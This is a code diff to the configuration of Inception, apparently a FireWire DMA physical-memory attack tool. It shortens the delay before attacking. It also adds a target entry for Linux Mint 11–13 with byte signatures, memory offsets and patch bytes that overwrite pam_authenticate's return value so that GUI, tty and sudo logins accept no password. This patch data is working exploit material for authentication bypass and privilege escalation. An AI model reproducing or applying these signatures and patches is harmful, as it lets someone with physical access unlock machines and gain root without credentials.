@@ -24,7 +24,7 @@ Created on Sep 6, 2011
 #===============================================================================
 # General information
 #===============================================================================
-version = '0.2.1'
+version = '0.2.2'
 url = 'http://breaknenter.org/projects/inception'
 
 #===============================================================================
@@ -43,7 +43,7 @@ WINDOWS = 'Windows'
 # Global variables/default settings
 #===============================================================================
 verbose = False                 # Not verbose
-fw_delay = 15                   # 15 seconds delay before attacking
+fw_delay = 5                    # 5 seconds delay before attacking
 filemode = False                # Search in file instead of FW DMA
 dry_run = False                 # No write-back into memory
 target = False                  # No target set
@@ -256,6 +256,21 @@ targets=[{'OS': 'Windows 8',
                           'chunks': [{'chunk': 0xe80105000083f81f,
                                       'internaloffset': 0x00,
                                       'patch': 0x6631c0, # xor eax,eax
-                                      'patchoffset': 0x05}]}]}]
+                                      'patchoffset': 0x05}]}]},
+         {'OS': 'Linux Mint',
+          'versions': ['11','12','13'],
+          'architectures': ['x86', 'x64'],
+          'name': 'libpam unlock/privilege escalation',
+          'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
+          'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
+                          'chunks': [{'chunk': 0x83f81f89c774,
+                                      'internaloffset': 0x00,
+                                      'patch': 0xbf00000000eb,
+                                      'patchoffset': 0x00}]},
+                         {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
+                          'chunks': [{'chunk': 0x83f81f89c574,
+                                      'internaloffset': 0x00,
+                                      'patch': 0xbd00000000eb,
+                                      'patchoffset': 0x00}]}]}]
 
 egg = False
